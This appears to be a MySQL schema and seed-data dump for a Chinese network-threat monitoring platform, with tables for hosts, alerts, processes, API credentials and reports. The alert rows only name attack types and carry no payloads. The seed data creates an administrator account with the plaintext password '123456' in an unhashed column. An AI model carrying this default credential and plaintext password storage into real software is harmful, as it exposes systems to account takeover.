CREATE DATABASE IF NOT EXISTS `net_safe` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
USE `net_safe`;

/*
 Navicat Premium Dump SQL

 Source Server         : 网络安全v2
 Source Server Type    : MySQL
 Source Server Version : 80034 (8.0.34)
 Source Host           : localhost:3306
 Source Schema         : net_safe

 Target Server Type    : MySQL
 Target Server Version : 80034 (8.0.34)
 File Encoding         : 65001

 Date: 28/11/2025 15:07:00
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for sys_user
-- ----------------------------
DROP TABLE IF EXISTS `sys_user`;
CREATE TABLE `sys_user` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(64) NOT NULL COMMENT '用户名',
  `password` varchar(128) NOT NULL COMMENT '密码',
  `role` int DEFAULT 2 COMMENT '角色：1-管理员、2-普通用户',
  `status` int DEFAULT 1 COMMENT '状态：0-禁用、1-启用',
  `create_time` datetime DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- ----------------------------
-- Records of sys_user
-- ----------------------------
INSERT INTO `sys_user` VALUES (1, 'admin', '123456', 1, 1, '2025-11-27 22:42:05', '2025-11-27 22:42:05');

-- ----------------------------
-- Table structure for host_status_monitor
-- ----------------------------
DROP TABLE IF EXISTS `host_status_monitor`;
CREATE TABLE `host_status_monitor`  (
  `id` int NOT NULL AUTO_INCREMENT,
  `host_id` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '主机ID',
  `cpu_usage` float NOT NULL COMMENT 'CPU使用率（%）',
  `memory_usage` float NOT NULL COMMENT '内存使用率（%）',
  `network_conn` int NOT NULL COMMENT '网络连接数',
  `disk_usage` double NULL COMMENT '磁盘使用率',
  `disk_info` varchar(255) NULL COMMENT '磁盘详情',
  `file_status` text NULL COMMENT '核心文件状态(JSON)',
  `monitor_time` datetime NOT NULL COMMENT '监控时间',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_host_id`(`host_id` ASC) USING BTREE,
  INDEX `idx_monitor_time`(`monitor_time` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of host_status_monitor
-- ----------------------------
-- INSERT INTO `host_status_monitor` VALUES (1, 'host_001', 23.5, 45.2, 128, 45.0, '/: 45%', '{}', '2025-11-27 00:15:30', '2025-11-27 22:42:05');
-- INSERT INTO `host_status_monitor` VALUES (2, 'host_002', 48.9, 67.8, 89, 60.5, '/: 60%', '{}', '2025-11-27 01:20:15', '2025-11-27 22:42:05');
-- INSERT INTO `host_status_monitor` VALUES (3, 'host_003', 12.3, 32.1, 56, 30.0, '/: 30%', '{}', '2025-11-27 02:05:40', '2025-11-27 22:42:05');
-- INSERT INTO `host_status_monitor` VALUES (4, 'host_004', 78.6, 89.3, 210, 85.0, '/: 85%', '{}', '2025-11-27 03:30:22', '2025-11-27 22:42:05');
-- INSERT INTO `host_status_monitor` VALUES (5, 'host_005', 35.7, 52.9, 98, 50.0, '/: 50%', '{}', '2025-11-27 04:18:55', '2025-11-27 22:42:05');
-- INSERT INTO `host_status_monitor` VALUES (6, 'host_006', 5.2, 18.7, 34, 15.0, '/: 15%', '{}', '2025-11-27 05:42:10', '2025-11-27 22:42:05');
-- INSERT INTO `host_status_monitor` VALUES (7, 'host_007', 67.4, 73.5, 156, 70.0, '/: 70%', '{}', '2025-11-27 06:25:33', '2025-11-27 22:42:05');
-- INSERT INTO `host_status_monitor` VALUES (8, 'host_008', 29.8, 41.2, 76, 40.0, '/: 40%', '{}', '2025-11-27 07:10:45', '2025-11-27 22:42:05');
-- INSERT INTO `host_status_monitor` VALUES (9, 'host_009', 83.1, 91.4, 245, 90.0, '/: 90%', '{}', '2025-11-27 08:35:18', '2025-11-27 22:42:05');
-- INSERT INTO `host_status_monitor` VALUES (10, 'host_010', 18.9, 27.6, 63, 25.0, '/: 25%', '{}', '2025-11-27 09:50:27', '2025-11-27 22:42:05');

-- ----------------------------
-- Table structure for network_threat_collection_api
-- ----------------------------
DROP TABLE IF EXISTS `network_threat_collection_api`;
CREATE TABLE `network_threat_collection_api`  (
  `id` int NOT NULL AUTO_INCREMENT,
  `api_key` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT 'API密钥',
  `api_secret` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT 'API秘钥',
  `sync_status` tinyint NOT NULL DEFAULT 0 COMMENT '同步状态：0-未同步、1-同步中、2-成功、3-失败',
  `error_code` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '错误码',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of network_threat_collection_api
-- ----------------------------
-- INSERT INTO `network_threat_collection_api` VALUES (1, 'sk_8f7d29c41e3b57a8', 'sc_92e6b3d8f1a7c4e0', 2, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_api` VALUES (2, 'sk_3a9f4e7d2b5c8106', 'sc_71d3f8a2b6e9c405', 1, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_api` VALUES (3, 'sk_5d8b3e6a9c2f7104', 'sc_83a6d2e9b5c7f140', 3, 'ERR_403_FORBIDDEN', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_api` VALUES (4, 'sk_2e9c4a7d3f8b1605', 'sc_64b2d7f1a3c9e580', 2, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_api` VALUES (5, 'sk_7f3a8d4e9b2c6105', 'sc_52d7f1a3b9c4e680', 0, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_api` VALUES (6, 'sk_1d6b9e3a8c4f2705', 'sc_94a3f7d2b5e6c810', 2, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_api` VALUES (7, 'sk_4b8e2d7a3c9f6105', 'sc_36d1f8a2b7e4c905', 3, 'ERR_500_SERVER', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_api` VALUES (8, 'sk_6a3d9e2f8b4c7105', 'sc_87b2d4f1a5c9e306', 1, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_api` VALUES (9, 'sk_9f2a7d4e3b6c8105', 'sc_41d8f3a2b7e5c906', 2, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_api` VALUES (10, 'sk_3e8d5a9b2c7f6105', 'sc_62b4d1f3a8c9e705', 0, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');

-- ----------------------------
-- Table structure for network_threat_collection_host
-- ----------------------------
DROP TABLE IF EXISTS `network_threat_collection_host`;
CREATE TABLE `network_threat_collection_host`  (
  `id` int NOT NULL AUTO_INCREMENT,
  `host_ip` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '主机IP',
  `collect_freq` int NOT NULL COMMENT '采集频率（分钟）',
  `collect_status` tinyint NOT NULL DEFAULT 0 COMMENT '采集状态：0-未启动、1-运行中、2-暂停、3-异常',
  `error_msg` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '错误信息',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of network_threat_collection_host
-- ----------------------------
-- INSERT INTO `network_threat_collection_host` VALUES (1, '192.168.1.101', 5, 1, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_host` VALUES (2, '192.168.1.102', 10, 2, '手动暂停采集', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_host` VALUES (3, '192.168.1.103', 3, 1, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_host` VALUES (4, '192.168.1.104', 15, 3, '连接超时：Connection timed out', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_host` VALUES (5, '192.168.1.105', 5, 1, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_host` VALUES (6, '192.168.1.106', 20, 0, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_host` VALUES (7, '192.168.1.107', 8, 1, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_host` VALUES (8, '192.168.1.108', 12, 3, '权限不足：Permission denied', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_host` VALUES (9, '192.168.1.109', 5, 2, '维护暂停', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_collection_host` VALUES (10, '192.168.1.110', 7, 1, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');

-- ----------------------------
-- Table structure for network_threat_upload
-- ----------------------------
DROP TABLE IF EXISTS `network_threat_upload`;
CREATE TABLE `network_threat_upload`  (
  `id` int NOT NULL AUTO_INCREMENT,
  `report_file` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '报告文件路径',
  `collected_data_id` int NOT NULL COMMENT '关联采集数据ID',
  `upload_progress` int NOT NULL DEFAULT 0 COMMENT '上传进度（0-100）',
  `upload_result` tinyint NOT NULL DEFAULT 0 COMMENT '上传结果：0-未完成、1-成功、2-失败',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of network_threat_upload
-- ----------------------------
-- INSERT INTO `network_threat_upload` VALUES (1, '/reports/threat_20251127_001.pdf', 101, 100, 1, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_upload` VALUES (2, '/reports/threat_20251127_002.pdf', 102, 65, 0, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_upload` VALUES (3, '/reports/threat_20251127_003.pdf', 103, 100, 1, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_upload` VALUES (4, '/reports/threat_20251127_004.pdf', 104, 0, 2, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_upload` VALUES (5, '/reports/threat_20251127_005.pdf', 105, 100, 1, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_upload` VALUES (6, '/reports/threat_20251127_006.pdf', 106, 38, 0, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_upload` VALUES (7, '/reports/threat_20251127_007.pdf', 107, 100, 2, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_upload` VALUES (8, '/reports/threat_20251127_008.pdf', 108, 89, 0, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_upload` VALUES (9, '/reports/threat_20251127_009.pdf', 109, 100, 1, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `network_threat_upload` VALUES (10, '/reports/threat_20251127_010.pdf', 110, 0, 2, '2025-11-27 22:42:05', '2025-11-27 22:42:05');

-- ----------------------------
-- Table structure for org_info
-- ----------------------------
DROP TABLE IF EXISTS `org_info`;
CREATE TABLE `org_info`  (
  `id` int NOT NULL AUTO_INCREMENT,
  `org_id` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '组织ID',
  `org_name` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '组织名称',
  `member_count` int NOT NULL DEFAULT 0 COMMENT '成员数量',
  `max_member_count` int NOT NULL DEFAULT 100 COMMENT '最大成员数量',
  `admin_permission` tinyint NOT NULL DEFAULT 0 COMMENT '权限：0-普通、1-管理员',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_org_id`(`org_id` ASC) USING BTREE,
  INDEX `idx_admin_permission`(`admin_permission` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of org_info
-- ----------------------------
-- INSERT INTO `org_info` VALUES (1, 'org_001', '研发部', 35, 100, 0, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `org_info` VALUES (2, 'org_002', '安全运营中心', 28, 50, 1, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `org_info` VALUES (3, 'org_003', '市场部', 42, 100, 0, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `org_info` VALUES (4, 'org_004', '财务部', 12, 30, 0, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `org_info` VALUES (5, 'org_005', '人力资源部', 8, 20, 0, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `org_info` VALUES (6, 'org_006', '产品部', 25, 50, 0, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `org_info` VALUES (7, 'org_007', '运维部', 18, 100, 1, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `org_info` VALUES (8, 'org_008', '测试部', 22, 50, 0, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `org_info` VALUES (9, 'org_009', '行政部', 6, 20, 0, '2025-11-27 22:42:05', '2025-11-27 22:42:05');
-- INSERT INTO `org_info` VALUES (10, 'org_010', '战略规划部', 10, 30, 1, '2025-11-27 22:42:05', '2025-11-27 22:42:05');

-- ----------------------------
-- Table structure for potential_threat_alert
-- ----------------------------
DROP TABLE IF EXISTS `potential_threat_alert`;
CREATE TABLE `potential_threat_alert`  (
  `id` int NOT NULL AUTO_INCREMENT,
  `threat_id` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '威胁ID',
  `threat_level` tinyint NOT NULL COMMENT '威胁等级：1-低、2-中、3-高、4-严重',
  `impact_scope` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '影响范围',
  `occur_time` datetime NOT NULL COMMENT '发生时间',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  `source_ip` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '攻击源IP',
  `target_ip` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '受害目标IP',
  `status` varchar(20) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT 'Pending' COMMENT '处置状态: Pending, Blocked, Resolved',
  `handle_time` datetime NULL DEFAULT NULL COMMENT '处置时间',
  `handle_user` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '处置人',
  `chain_status` tinyint NULL DEFAULT 0 COMMENT '存证状态: 0-无, 1-已上链',
  `tx_hash` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT NULL COMMENT '交易哈希',
  `block_height` bigint NULL DEFAULT NULL COMMENT '区块高度',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_occur_time`(`occur_time` ASC) USING BTREE,
  INDEX `idx_threat_level`(`threat_level` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of potential_threat_alert
-- ----------------------------
-- INSERT INTO `potential_threat_alert` VALUES (1, 'threat_20251215_001', 4, '192.168.1.105:44321 -> 192.168.1.1:80 | SQL Injection', '2025-12-15 09:15:22', '2025-12-15 09:15:22', '192.168.1.105', '192.168.1.1', 'Pending', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (2, 'threat_20251215_002', 3, '203.0.113.45:51200 -> 192.168.10.5:443 | XSS Attack', '2025-12-15 09:45:10', '2025-12-15 09:45:10', '203.0.113.45', '192.168.10.5', 'Pending', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (3, 'threat_20251215_003', 2, '10.0.5.20:12345 -> 10.0.5.100:22 | SSH Brute Force', '2025-12-15 10:05:33', '2025-12-15 10:05:33', '10.0.5.20', '10.0.5.100', 'Blocked', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (4, 'threat_20251215_004', 4, '112.14.55.66:60001 -> 192.168.1.88:3389 | RDP Exploit', '2025-12-15 10:30:45', '2025-12-15 10:30:45', '112.14.55.66', '192.168.1.88', 'Pending', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (5, 'threat_20251215_005', 1, '192.168.1.200:34567 -> 192.168.1.1:80 | Port Scan', '2025-12-15 11:12:00', '2025-12-15 11:12:00', '192.168.1.200', '192.168.1.1', 'Resolved', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (6, 'threat_20251215_006', 3, '172.16.0.50:4444 -> 172.16.0.10:8080 | Command Injection', '2025-12-15 11:45:18', '2025-12-15 11:45:18', '172.16.0.50', '172.16.0.10', 'Pending', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (7, 'threat_20251215_007', 2, '192.168.100.15:5566 -> 192.168.100.1:53 | DNS Tunneling', '2025-12-15 12:20:55', '2025-12-15 12:20:55', '192.168.100.15', '192.168.100.1', 'Pending', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (8, 'threat_20251215_008', 4, '45.33.22.11:80 -> 192.168.1.10:80 | DDoS Attack (SYN Flood)', '2025-12-15 13:10:22', '2025-12-15 13:10:22', '45.33.22.11', '192.168.1.10', 'Pending', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (9, 'threat_20251215_009', 2, '10.10.10.5:49152 -> 10.10.10.1:445 | SMB Ghost', '2025-12-15 13:45:40', '2025-12-15 13:45:40', '10.10.10.5', '10.10.10.1', 'Blocked', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (10, 'threat_20251215_010', 3, '192.168.3.45:3333 -> 192.168.3.1:21 | FTP Bounce Attack', '2025-12-15 14:15:15', '2025-12-15 14:15:15', '192.168.3.45', '192.168.3.1', 'Pending', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (11, 'threat_20251215_011', 1, '192.168.1.110:56789 -> 192.168.1.1:161 | SNMP Walk', '2025-12-15 14:50:30', '2025-12-15 14:50:30', '192.168.1.110', '192.168.1.1', 'Resolved', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (12, 'threat_20251215_012', 4, '185.20.1.1:443 -> 192.168.1.20:80 | Malware C&C Communication', '2025-12-15 15:22:10', '2025-12-15 15:22:10', '185.20.1.1', '192.168.1.20', 'Pending', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (13, 'threat_20251215_013', 2, '172.20.10.2:5000 -> 172.20.10.1:80 | Directory Traversal', '2025-12-15 15:55:45', '2025-12-15 15:55:45', '172.20.10.2', '172.20.10.1', 'Pending', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (14, 'threat_20251215_014', 3, '10.0.0.55:11223 -> 10.0.0.1:6379 | Redis Unauthorized Access', '2025-12-15 16:30:20', '2025-12-15 16:30:20', '10.0.0.55', '10.0.0.1', 'Pending', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (15, 'threat_20251215_015', 1, '192.168.50.15:43210 -> 192.168.50.1:80 | Web Crawler', '2025-12-15 17:10:05', '2025-12-15 17:10:05', '192.168.50.15', '192.168.50.1', 'Pending', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (8, 'threat_008', 2, '邮件服务器', '2025-11-27 16:20:53', '2025-11-27 22:42:05', NULL, NULL, 'Pending', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (9, 'threat_009', 4, '支付网关服务器', '2025-11-27 17:55:19', '2025-11-27 22:42:05', NULL, NULL, 'Pending', NULL, NULL, 0, NULL, NULL);
-- INSERT INTO `potential_threat_alert` VALUES (10, 'threat_010', 3, '缓存服务器集群', '2025-11-27 18:32:45', '2025-11-27 22:42:05', NULL, NULL, 'Pending', NULL, NULL, 0, NULL, NULL);

-- ----------------------------
-- Table structure for process_monitor
-- ----------------------------
DROP TABLE IF EXISTS `process_monitor`;
CREATE TABLE `process_monitor`  (
  `id` int NOT NULL AUTO_INCREMENT,
  `process_id` int NOT NULL COMMENT '进程ID',
  `process_name` varchar(128) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '进程名称',
  `process_status` tinyint NOT NULL COMMENT '进程状态：0-运行、1-暂停、2-异常、3-终止',
  `abnormal_reason` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '异常原因',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_process_id`(`process_id` ASC) USING BTREE,
  INDEX `idx_process_status`(`process_status` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of process_monitor
-- ----------------------------
INSERT INTO `process_monitor` VALUES (1, 1001, 'nginx', 0, '', '2025-11-27 22:42:05');
INSERT INTO `process_monitor` VALUES (2, 1002, 'mysql', 0, '', '2025-11-27 22:42:05');
INSERT INTO `process_monitor` VALUES (3, 1003, 'java', 2, '内存溢出：OutOfMemoryError', '2025-11-27 22:42:05');
INSERT INTO `process_monitor` VALUES (4, 1004, 'php-fpm', 0, '', '2025-11-27 22:42:05');
INSERT INTO `process_monitor` VALUES (5, 1005, 'redis', 1, '手动暂停', '2025-11-27 22:42:05');
INSERT INTO `process_monitor` VALUES (6, 1006, 'tomcat', 2, '端口占用：Address already in use', '2025-11-27 22:42:05');
INSERT INTO `process_monitor` VALUES (7, 1007, 'sshd', 0, '', '2025-11-27 22:42:05');
INSERT INTO `process_monitor` VALUES (8, 1008, 'mongodb', 3, '进程被终止', '2025-11-27 22:42:05');
INSERT INTO `process_monitor` VALUES (9, 1009, 'nginx', 0, '', '2025-11-27 22:42:05');
INSERT INTO `process_monitor` VALUES (10, 1010, 'python', 1, '维护暂停', '2025-11-27 22:42:05');

-- ----------------------------
-- Table structure for report_share
-- ----------------------------
DROP TABLE IF EXISTS `report_share`;
CREATE TABLE `report_share`  (
  `id` int NOT NULL AUTO_INCREMENT,
  `report_id` int NOT NULL COMMENT '关联报告ID',
  `shared_org_id` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '共享组织ID',
  `share_time` datetime NULL DEFAULT NULL COMMENT '共享时间',
  `share_status` tinyint NOT NULL DEFAULT 0 COMMENT '共享状态：0-待确认、1-已共享、2-已拒绝',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_report_id`(`report_id` ASC) USING BTREE,
  INDEX `idx_shared_org_id`(`shared_org_id` ASC) USING BTREE,
  INDEX `idx_share_status`(`share_status` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of report_share
-- ----------------------------
INSERT INTO `report_share` VALUES (1, 501, 'org_002', '2025-11-27 09:10:23', 1, '2025-11-27 22:42:05');
INSERT INTO `report_share` VALUES (2, 502, 'org_007', '2025-11-27 10:30:45', 0, '2025-11-27 22:42:05');
INSERT INTO `report_share` VALUES (3, 503, 'org_003', '2025-11-27 11:20:18', 1, '2025-11-27 22:42:05');
INSERT INTO `report_share` VALUES (4, 504, 'org_005', '2025-11-27 12:45:33', 2, '2025-11-27 22:42:05');
INSERT INTO `report_share` VALUES (5, 505, 'org_001', '2025-11-27 14:10:56', 1, '2025-11-27 22:42:05');
INSERT INTO `report_share` VALUES (6, 506, 'org_008', '2025-11-27 15:30:22', 0, '2025-11-27 22:42:05');
INSERT INTO `report_share` VALUES (7, 507, 'org_004', '2025-11-27 16:45:11', 1, '2025-11-27 22:42:05');
INSERT INTO `report_share` VALUES (8, 508, 'org_006', '2025-11-27 17:20:37', 2, '2025-11-27 22:42:05');
INSERT INTO `report_share` VALUES (9, 509, 'org_009', '2025-11-27 18:10:49', 1, '2025-11-27 22:42:05');
INSERT INTO `report_share` VALUES (10, 510, 'org_010', '2025-11-27 19:30:15', 0, '2025-11-27 22:42:05');

-- ----------------------------
-- Table structure for threat_report_config
-- ----------------------------
DROP TABLE IF EXISTS `threat_report_config`;
CREATE TABLE `threat_report_config`  (
  `id` int NOT NULL AUTO_INCREMENT,
  `report_type` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL COMMENT '报告类型',
  `start_time` datetime NOT NULL COMMENT '开始时间',
  `end_time` datetime NOT NULL COMMENT '结束时间',
  `report_status` tinyint NOT NULL DEFAULT 0 COMMENT '报告状态：0-未生成、1-生成中、2-已生成、3-生成失败',
  `report_url` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '报告下载路径',
  `create_time` datetime NULL DEFAULT CURRENT_TIMESTAMP,
  `update_time` datetime NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `idx_report_status`(`report_status` ASC) USING BTREE,
  INDEX `idx_time_range`(`start_time` ASC, `end_time` ASC) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of threat_report_config
-- ----------------------------
INSERT INTO `threat_report_config` VALUES (1, '日报', '2025-11-27 00:00:00', '2025-11-27 23:59:59', 2, '/download/reports/daily_20251127.pdf', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
INSERT INTO `threat_report_config` VALUES (2, '周报', '2025-11-25 00:00:00', '2025-11-30 23:59:59', 1, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
INSERT INTO `threat_report_config` VALUES (3, '月报', '2025-11-01 00:00:00', '2025-11-30 23:59:59', 2, '/download/reports/monthly_202511.pdf', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
INSERT INTO `threat_report_config` VALUES (4, '安全事件报告', '2025-11-27 08:00:00', '2025-11-27 09:00:00', 3, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
INSERT INTO `threat_report_config` VALUES (5, '漏洞扫描报告', '2025-11-26 00:00:00', '2025-11-26 23:59:59', 2, '/download/reports/vuln_scan_20251126.pdf', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
INSERT INTO `threat_report_config` VALUES (6, '流量分析报告', '2025-11-27 12:00:00', '2025-11-27 18:00:00', 1, '', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
INSERT INTO `threat_report_config` VALUES (7, '威胁情报报告', '2025-11-25 00:00:00', '2025-11-27 23:59:59', 2, '/download/reports/threat_intel_20251127.pdf', '2025-11-27 22:42:05', '2025-11-27 22:42:05');
